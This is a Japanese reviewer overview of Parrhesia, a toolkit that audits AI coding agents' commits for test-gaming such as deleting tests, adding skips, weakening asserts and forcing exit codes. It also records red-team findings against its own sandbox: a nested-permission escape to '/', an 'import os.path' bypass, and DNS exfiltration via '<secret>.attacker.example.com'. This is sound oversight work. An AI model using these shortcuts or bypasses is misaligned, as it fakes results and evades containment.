# レビュー担当者向け概要 — Parrhesia(旧名 Pleroma)

[トップに戻る](../README.md) | [English version](./REVIEWER_OVERVIEW.en.md)

**この文書の立場について、最初に明示します。** 以下の記述には3種類あります。
(1) GitHub Actions上の実際のCI実行ログから引用した、ネットワーク制限の無い環境での
検証結果。(2) ユーザー自身のパソコン(Windows)で実際に実行した、実機での検証結果。
(3) このドキュメントの作成に使っているサンドボックス環境自体では検証できていない
内容(その都度、どれに当たるかを明記します)。「すべて実行して確認した」という
一括した言い切りはしません。

## 0. 先に: このツールが検出できないこと(3行)

- 文章上の主張(「全エッジケースを検証済み」等)が事実かどうかの判定(別モデル・
  人間レビューが必要な別の仕組み)。
- 正当なコミットに対する誤検知率の、大規模サンプルでの実測(現状は陰性対照1件のみ)。
- このツール自身の運用(証明書管理等)が、プロジェクトが掲げる原則を常に守っている
  という保証。実際、1件の既知の矛盾があります(§2参照)。

## 1. 用語集(初見の読者向け)

| このリポジトリでの呼び方 | 平易に言うと |
| --- | --- |
| **angels/**(天使) | 約55本のCIチェック。「過去に見つけた欠陥が再発していないか」を、push毎に機械的に再検証する回帰テスト群。 |
| **GRIMOIRE.md** | 見つけた欠陥すべての生の記録(§A〜§CXの通し番号)。1件ごとに発見経緯・原因・修正・検証方法を書いた、エンジニアリング日誌。 |
| **Sanctuary / Sanctum** | AI生成コードを実行する際の、ファイルアクセス制限・ネットワーク遮断などの隔離機構(サンドボックス)の社内呼称。 |
| **§A〜§CX** | GRIMOIRE.md内の個別の欠陥記録につけた通し番号(アルファベット式)。例: §AVは32番目、§CXは101番目の記録。 |

## 2. このプロジェクトは何をするものか

**Parrhesia** は、AIコーディングエージェントが「直しました、テスト全部通りました」と
報告したコミットを、その**差分そのもの**から監査するツールキットです。AIエージェントが
時間的制約の中で取りがちな、5種類の具体的な「ズル」を検出します: テストの削除、
スキップマーカーの追加、assertの弱体化、例外の握り潰し、終了コードの固定化。

さらに、このツールキット自身を「自分で監査されるAIエージェント」として使い、自分自身の
防御コード(ゼロトラスト・ランタイムガード)の欠陥を、自分自身を攻撃するレッドチーム
コードで見つけ続ける、という二重構造になっています。この「自己適用」が、プロジェクトの
一番の実証材料です。

- 詳細: [README.md](../README.md) / [English README](../README.en.md)
- 実際に動く再現デモとその結果: [docs/CASE_STUDY.md](./CASE_STUDY.md)

### 2.1 既知の自己矛盾(隠さず記録しています)

このツールキットは「ゼロトラスト」を掲げていますが、証明書(`ataraxia_certificate.json`)
を毎週自動更新する補助スクリプト(`tools/renew_certificate.ps1`/`.sh`)は、本来人間が
帯外(別経路)で確認してから承認するはずの手順を、自動承認にすり替えてしまっています。
実際に実行すると、信頼の起点(公開鍵)の指紋が実行ごとに入れ替わる様子がログに残ります。

これは隠すのではなく、**自分自身で見つけた欠陥として** [GRIMOIRE.md §CX](../GRIMOIRE.md)
に記録し、[docs/BOUNDARY.md](./BOUNDARY.md)の既知の限界にも追記しました。恒久的な
修正(帯外確認を自動化の外に残す、または単一デバイス限定を技術的に強制する)は、
この文書を書いている時点では未着手です。評価者がこのツールの誠実さの一貫性を判断する
上で、最も確認すべき点だと考え、冒頭近くに記載しています。

## 3. どうやって欠陥を見つけ続けているか

`angels/`以下のCIチェックが、過去に見つかった欠陥の再発を機械的に検知し続ける仕組みに
なっています。GRIMOIRE.mdの記録は、実際に数えた結果、本稿執筆時点で**101件
(§A〜§CX)**です(DEVLOG.mdの読み物版は81件時点のまま更新されておらず、その旨を
DEVLOG.md側にも明記しました)。

101件を振り返ると、欠陥は大きく3パターンに分類できます:

1. **別の名前のAPIで同じ迂回ができる** — 例: `import os`だけを禁止していたコードが
   `import os.path`で回避できた。
2. **承認・学習したつもりで、実際には何も反映されていない** — 例: 人間が承認した
   脅威情報が、実際の防御フック側から一度も読まれていなかった。
3. **安全装置が本当に発火するか誰も確かめていない** — 例: 「実行は不可能です」という
   判決を出しながら、プロセスの終了コードは常に0(正常終了)だった。

### 代表3件(再現手順・コミット・証拠つき)

| 記録 | 何が起きていたか | 再現手順(実機検証済み) | 修正コミット |
| --- | --- | --- | --- |
| [§AV](../GRIMOIRE.md) — 最も驚いた発見 | ネストしたサンドボックスの許可範囲が、絞るはずの操作で逆に**ファイルシステム全体まで広がる**バグ。`allowed_dirs=["jail_workspace"]`の内側で子が`allowed_dirs=["/"]`を指定すると、方向性を誤った包含判定(A or B)により実効範囲が`/`に昇格していた。 | 親Sanctum内で子Sanctumを`allowed_dirs=["/"]`で開き、`/tmp/`への書き込みを試行 → 例外無しで書き込みが成功(脱獄確認)。修正後は`tests/test_sanctum_nested_allowed_dirs_widening.py`の5件で固定。 | [`b9541be`](https://github.com/anjo-da-maquina/parrhesia/commit/b9541be11c8a22f4c14e31832c705035f8acdda2) |
| [§AR](../GRIMOIRE.md) | 判決文言は「実行は不可能です」と表示しながら、CLIの終了コードは常に`0`(成功)。呼び出し元スクリプトは終了コードで合否判定できなかった。 | `python src/kamael_judgment.py <違反ファイル>`を実行 → 画面は拒否を表示するが`echo $?`は常に0。 | [`2c32938`](https://github.com/anjo-da-maquina/parrhesia/commit/2c3293818e5602982aa829753cae5868a65868d8) |
| [§CT](../GRIMOIRE.md) | `socket.getaddrinfo()`(DNS名前解決)が、`connect()`を経由しないため2つの独立した防御層のどちらからも素通り。機密データをサブドメインに符号化して問い合わせるだけで外部に送出できた(DNS exfiltration)。 | 許可ホスト以外のホスト名(`"<secret>.attacker.example.com"`)で`getaddrinfo()`を呼ぶ → 遮断されずOSの名前解決エラーのみで失敗(=何も遮断していない証拠)。修正後は実際にDNS送出チェーンを再現し、両層で遮断されることを確認。 | [`fe8b54f`](https://github.com/anjo-da-maquina/parrhesia/commit/fe8b54f81fdefd912af6dec71322667f7a54b9a0) → real CI確認 [`90e0c1a`](https://github.com/anjo-da-maquina/parrhesia/commit/90e0c1a85ecb66aef1e1d1b9ef8ef4e7d4bff974) |

全件の詳細は [GRIMOIRE.md](../GRIMOIRE.md)、読み物として整理したものは [DEVLOG.md](../DEVLOG.md) にあります。

## 4. 現在のテストスイートの状態(実測・引用元つき)

### CI(ネットワーク制限なし)での結果

```
commit:  f83a17a
run:     Sanctuary CI/CD — https://github.com/anjo-da-maquina/parrhesia/actions/runs/43173405996
結論:    success(失敗コメント0件)
結果:    828 passed, 2 xfailed, 11 xpassed, 2 warnings in 43.59s
```

`xpassed`(xfail指定していたテストが実際に通った)が11件出るのは意図的な設計です。
その11件は`rsa`という鍵生成ライブラリに依存するテスト(例:
`tests/test_guard_ctypes_dlsym_bypass.py`・`tests/test_gatekeeper_ctypes_dlsym_bypass_guard.py`・
`tests/test_thread_safety_maquina_seal.py`・`tests/test_openai_agent_loop_template.py`内の
各1〜4件)で、この文書を作業しているサンドボックスはPyPIに接続できず`rsa`をインストール
できないため、そちらでは`pytest.mark.xfail(strict=False)`付きで失敗を許容しています。
CI(ネットワーク制限なし、`rsa`が実際に入る)では普通に通るため、`xpassed`として報告され、
`strict=False`のためCIは赤くなりません。**この11件は「サンドボックスでは検証できないが、
CI環境では実際に正しく動いている」という環境差の記録であり、「xpassedが多いほど良い」
という意味ではありません**——第三者の環境でも`rsa`をインストールして実行すれば、この
11件は通常の`passed`として扱われます。

残る`2 xfailed`は`rsa`とは無関係です: `tests/test_orchestrator.py::test_orchestrator_initialization`
(理由: "Orchestrator API is pending implementation")と、
`tests/test_sandbox.py::test_docker_sandbox_isolation`
(理由: "DockerSandbox implementation is pending")——いずれも、該当API自体がまだ実装
されていないことを示す、古くからの`strict=True`指定のxfailです。

### このサンドボックス自身での結果(今回、実際に確認・修正したもの)

このサンドボックスには`rsa`がインストールされておらず、PyPIにも接続できないため
(`pip install rsa`を実際に試し、名前解決エラーを確認済み)、以前は`tests/conftest.py`
自体の読み込みが失敗し、**テストスイート全体の収集(collection)が完全に止まっていました**
(実際に`python3 -m pytest`を実行し、exit code 4・0件実行を確認)。

この問題は本レビューを受けて実際に修正しました(`tests/conftest.py`をtry/exceptで保護し、
`rsa`に直接依存する数ファイルに`pytest.importorskip("rsa")`を追加)。修正後、同じ
サンドボックスで再度実行した結果は以下の通りです(実際に実行して確認、推測ではありません):

```
$ python3 -m pytest -q
825 passed, 1 failed, 1 skipped, 14 xfailed, 62 warnings in 28.26s
```

- **1 failed**: `tests/test_pre_commit_secret_scan.py::test_preexisting_secret_in_unchanged_lines_is_not_reflagged`。
  原因はコードの欠陥ではなく、このサンドボックス特有の既知の不具合(git署名用の
  シンボリックリンク`/tmp/code-sign`が時々消える)で、git commitがこのテストの中でのみ
  失敗するもの。実際に`/tmp/code-sign`が存在しないことを確認済み。
- **1 skipped**: `tests/test_audit_hook_registration_fails_closed.py`(`rsa`依存、
  明確な理由付きでスキップ)。
- **14 xfailed**: `rsa`依存の既知の環境制約(大半)+ §CXとは別件の、本物の証明書期限切れ
  に起因するもの1件。

## 5. このプロジェクトを実際に動かしてきた人間とAIエージェントの作業プロセス

このプロジェクトの開発は、人間(リポジトリ所有者)とClaude(Anthropic製のAIエージェント)
が協働で行っています。署名コミット・CI実行の都度確認・過去の規約違反の正直な開示・
証明書自動化スクリプトの実機デバッグ(3段階の修正サイクル)など、具体的な作業記録は
別ファイルにまとめています。

→ [docs/worklog/ai-agent-notes.md](./worklog/ai-agent-notes.md)

## 6. 参照資料

| 資料 | 内容 |
| --- | --- |
| [README.md](../README.md) / [README.en.md](../README.en.md) | プロジェクト概要・使い方・脅威モデル・設計方針 |
| [docs/CASE_STUDY.md](./CASE_STUDY.md) | 実際に動くデモの再現手順と結果(5/5検出、初回は2/5だった失敗の記録も含む) |
| [DEVLOG.md](../DEVLOG.md) | 81件時点の欠陥発見を読み物として再構成したもの(最新件数はGRIMOIRE.md参照) |
| [GRIMOIRE.md](../GRIMOIRE.md) | §A〜§CX、101件の生の記録(最も詳細) |
| [docs/FAQ.md](./FAQ.md) | 差別化・制限事項などへのQ&A |
| [docs/WHY.md](./WHY.md) | なぜAIエージェントを信頼せず監査するのか、という設計思想 |
| [docs/BOUNDARY.md](./BOUNDARY.md) | このプロジェクトが「できること/できないこと」の境界線(§CXの既知の矛盾も記載) |
| [docs/worklog/ai-agent-notes.md](./worklog/ai-agent-notes.md) | AIエージェント自身の作業プロセスの詳細記録 |

## 7. 自分で再現する

```bash
git clone https://github.com/anjo-da-maquina/parrhesia.git && cd parrhesia
python3 demo/build_and_audit_demo.py
```

ネットワーク接続も、終了後に残る状態も不要です。`rsa`が無い環境でも、
`python3 -m pytest`はテストスイート全体を収集・実行できます(§4参照)。
